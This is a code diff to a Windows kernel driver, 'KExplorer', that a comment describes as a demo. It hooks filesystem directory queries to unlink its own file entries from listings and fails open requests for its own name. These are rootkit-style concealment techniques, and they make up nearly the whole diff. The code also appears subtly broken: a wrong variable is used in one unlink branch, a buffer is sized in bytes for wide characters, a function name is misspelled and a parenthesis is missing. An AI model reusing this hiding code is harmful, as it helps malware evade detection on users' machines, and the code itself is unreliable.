@@ -11,6 +11,7 @@ extern "C" {
 #endif
 
 PDRIVER_OBJECT KExplorer::KDriverObj;
+wchar_t* KExplorer::KExplorerSys;
 FAST_IO_DISPATCH KExplorer::FastIoDispatch;
 FAST_IO_DISPATCH KExplorer::FastIoDispatch =
 {
@@ -53,7 +54,16 @@ DriverEntry(
 )
 {
 	KExplorer::KDriverObj = DriverObj;
-	if (NT_SUCCESS(InitializeHook())
+	KExplorer::KExplorerSys = (wchar_t*) ExAllocatePoolWithTag(NonPagedPoolNx,
+								   KEXP_DRIVERNAME_LEN + 1,
+								   KEXP_TAG);
+	RtlSecureZeroMemory(KExplorer::KExplorerSys, KEXP_DRIVERNAME_LEN + 1);
+	wcsncpy(KExplorer::KExplorerSys,
+		KEXP_DRIVERNAME,
+		KEXP_DRIVERNAME_LEN + 1);
+	
+	auto Status = InitializeHook();
+	if (NT_SUCCESS(Status)
 	{
 		DriverObj->DriverUnload = [](PDRIVER_OBJECT DriverObj)
 		{
@@ -62,10 +72,50 @@ DriverEntry(
 			return;
 		};
 	}
-	else
-		return STATUS_UNSUCCESSFUL;
+	
+	return Status;
 
 }
+
+/*  wcsistr is a bitch to implement (or any case-insensitive subsearch: see BlockDriverFromLoading); 
+    you can't count on it being invoked.
+    So I wrote a wcschrr UNICODE_STRING safe routine instead because the
+    work involved in sustaining wcsistr is not worth it for a mere demo and
+    I'm using static values anyway
+*/
+
+BOOLEAN
+IsStrTerminated(
+	wchar_t* String,
+	ULONG Len
+)
+{
+	BOOLEAN IsTerminated { FALSE };
+	ULONG i {};
+	while (i < Len && IsTerminated == FALSE)
+	{
+		if (*(String + i) == L'\0') IsTerminated = TRUE;
+		else ++i;
+	}
+	return IsTerminated;
+}
+
+const wchar_t*
+__wcschrr(
+	wchar_t* Haystack,
+	ULONG HaystackLen,
+	wchar_t Needle
+)
+{
+	if (!Haystack) return nullptr;
+	for (size_t i {}; i < HaystackLen; ++i)
+	{
+		if (Haystack[i] == Needle)
+			return &Haystack[i];
+	}
+	return nullptr;
+}
+
 
 /* the device extension */
 struct SysRootExtension
@@ -104,14 +154,20 @@ SystemRootHookCompletionRoutine(
 						break;
 					}
 					auto FileInfo = (PFILE_BOTH_DIR_INFORMATION) Irp->UserBuffer;
+					auto Previous = FileInfo;
 					while (FileInfo->NextEntryOffset)
 					{
-						if (wcsistr(FileInfo->FileName,
-						            FileInfo->FileNameLength,
-							    L"KExplorer.sys"))
+						if (FileInfo->FileNameLength > 3)
 						{
-							memset(FileInfo->FileName, 0, FileInfo->FileNameLength);
+							if (FileInfo->FileName[0] == L'K' &&
+							    FileInfo->FileName[1] == L'E' &&
+							    FileInfo->FileName[2] == L'x')
+							{
+								Previous->NextEntryOffset += FileInfo->NextEntryOffset;
+								FileInfo = Previous;
+							}
 						}
+						Previous = FileInfo;
 						FileInfo = (PFILE_BOTH_DIR_INFORMATION) ((ULONG_PTR) FileInfo + FileInfo->NextEntryOffset);
 					}
 
@@ -124,14 +180,22 @@ SystemRootHookCompletionRoutine(
 						break;
 					}
 					auto FileIdInfo = (PFILE_ID_BOTH_DIR_INFORMATION) Irp->UserBuffer;
+					auto Previous = FileIdInfo;
 					while (FileIdInfo->NextEntryOffset)
 					{
-						if (wcsistr(FileIdInfo->FileName,
-						            FileIdInfo->FileNameLength,
-							    L"KExplorer.sys"))
+						if (FileIdInfo->FileNameLength > 3)
 						{
-							memset(FileIdInfo->FileName, 0, FileIdInfo->FileNameLength);
+							if (FileIdInfo->FileName[0] == L'K' &&
+							    FileIdInfo->FileName[1] == L'E' &&
+							    FileIdInfo->FileName[2] == L'x')
+							{
+								dprintf("# %.*S\n", FileIdInfo->FileNameLength / sizeof(wchar_t),
+										    &FileIdInfo->FileName[0]);
+								Previous->NextEntryOffset += FileInfo->NextEntryOffset;
+								FileIdInfo = Previous;
+							}
 						}
+						Previous = FileIdInfo;
 						FileIdInfo = (PFILE_ID_BOTH_DIR_INFORMATION) ((ULONG_PTR) FileIdInfo + FileIdInfo->NextEntryOffset);
 					}
 				} break;
@@ -264,12 +328,18 @@ InitiailzeHook()
 					Stack->MajorFunction == IRP_MJ_CREATE &&
 					Stack->Parameters.Create.Options & OBJ_CASE_INSENSITIVE)
 				{
-					__debugbreak();
-					/* TODO: fix this piece of shit */
-					null_terminate(&Stack->FileObject->FileName);
-					if (wcsistr(Stack->FileObject->FileName.Buffer,
-					            Stack->FileObject->FileName.Length,
-						    L"KExplorer.sys"))
+					if (Stack->FileObject->FileName.Length/2 < KEXP_DRIVERNAME_LEN)
+						goto End;
+						
+					auto Substring = __wcschrr(&Stack->FileObject->FileName.Buffer[0],
+								   Stack->FileObject->FileName.Length/2,
+								   L'K');
+					if (!Substring)
+						goto End;
+					
+					if (Substring[1] == L'E' &&
+					    Substring[2] == L'x' &&
+					    Substring[3] == L'p')
 					{
 						Irp->IoStatus.Status = STATUS_OBJECT_PATH_NOT_FOUND;
 						Irp->IoStatus.Information = 5ul;
